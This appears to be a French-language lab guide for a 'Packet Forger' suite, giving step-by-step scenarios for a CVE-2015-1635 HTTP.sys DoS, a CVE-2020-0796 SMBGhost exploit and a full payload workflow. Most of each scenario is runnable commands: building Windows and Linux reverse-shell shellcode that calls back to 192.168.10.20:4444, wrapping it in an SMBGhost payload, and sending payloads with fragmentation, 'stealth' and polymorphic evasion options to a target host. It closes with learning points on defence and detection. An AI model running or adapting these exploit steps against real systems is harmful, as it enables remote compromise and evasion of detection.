# 🎬 Scénarios Pédagogiques - Packet Forger Labs

## Scénario 1 : Test CVE-2015-1635 (HTTP.sys DoS)

### Objectif
Démontrer comment une requête HTTP malformée peut causer un DoS.

### Étapes

1. **Démarrer le serveur vulnérable**
```bash
cd packet-forger-labs/servers
python3 vulnerable_http_server.py 8080
```

2. **Générer le payload DoS**
```bash
cd ../cve
./CVE-2015-1635-http-dos /iisstart.htm > payload.bin
```

3. **Envoyer via packet-forger-core**
```bash
cd ../../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/cve/payload.bin \
    --target 127.0.0.1 \
    --port 8080
```

4. **Observer**
- Le serveur devrait répondre avec une erreur 416
- Ou planter si vraiment vulnérable

### Analyse

- **Wireshark**: Capturer le trafic pour analyser la requête Range malformée
- **Logs**: Observer les logs du serveur vulnérable
- **Comportement**: Comprendre pourquoi la valeur `18446744073709551615` cause un problème

---

## Scénario 2 : Test CVE-2020-0796 (SMBGhost)

### Objectif
Démontrer comment un buffer overflow dans SMBv3 peut être exploité.

### Étapes

1. **Générer un payload shellcode**
```bash
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output smbghost_shellcode.bin
```

2. **Encapsuler dans SMBGhost**
```bash
cd ../packet-forger-labs
python3 -c "
from cve.CVE_2020_0796_smbghost import generate_smb_compression_payload
with open('../packet-forger-payloads/smbghost_shellcode.bin', 'rb') as f:
    shellcode = f.read()
payload = bytearray(4096)
len = generate_smb_compression_payload(shellcode, len(shellcode), payload, 4096)
with open('smbghost_exploit.bin', 'wb') as f:
    f.write(payload[:len])
"
```

3. **Démarrer le serveur SMB vulnérable**
```bash
cd servers
sudo python3 vulnerable_smb_server.py 445
```

4. **Envoyer via packet-forger-core**
```bash
cd ../../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/smbghost_exploit.bin \
    --target 127.0.0.1 \
    --port 445
```

### Analyse

- **Structure SMB**: Analyser la structure du paquet SMBv3
- **Compression Header**: Comprendre le Compression Transform Header
- **Buffer Overflow**: Observer comment `OriginalCompressedSegmentSize` cause le problème

---

## Scénario 3 : Workflow Complet (Génération → Encapsulation → Transport)

### Objectif
Démontrer le workflow complet du Packet Forger Suite.

### Étapes

1. **Générer le payload** (packet-forger-payloads)
```bash
cd packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic \
    --output final_payload.bin
```

2. **Optionnel: Encapsuler dans un exploit CVE** (packet-forger-labs)
```bash
cd ../packet-forger-labs
# Utiliser un exploit CVE si nécessaire
```

3. **Transporter via le core** (packet-forger-core)
```bash
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/final_payload.bin \
    --target 192.168.10.5 \
    --port 80 \
    --fragment \
    --stealth
```

### Analyse

- **Séparation des responsabilités**: Chaque module fait son travail
- **Interface claire**: Communication via fichiers `.bin`
- **Modularité**: Possibilité de remplacer n'importe quel module

---

## 📊 Captures Réseau

Toutes les captures réseau doivent être sauvegardées dans `captures/` avec :
- Nom descriptif: `cve-2015-1635-test-YYYYMMDD.pcap`
- Documentation: Fichier `.md` expliquant la capture
- Annotations: Points clés à observer dans Wireshark

---

## 🎓 Points d'Apprentissage

### Pour chaque scénario, comprendre :

1. **La vulnérabilité**
   - Comment elle fonctionne
   - Pourquoi elle existe
   - Quels systèmes sont affectés

2. **L'exploitation**
   - Comment construire le payload
   - Comment l'envoyer
   - Quels sont les prérequis

3. **La défense**
   - Comment patcher
   - Comment détecter
   - Comment mitiger

4. **L'analyse réseau**
   - Comment capturer le trafic
   - Comment identifier l'exploit
   - Comment analyser les paquets

---

**Note**: Ces scénarios sont pédagogiques. Adapter selon votre environnement de test.

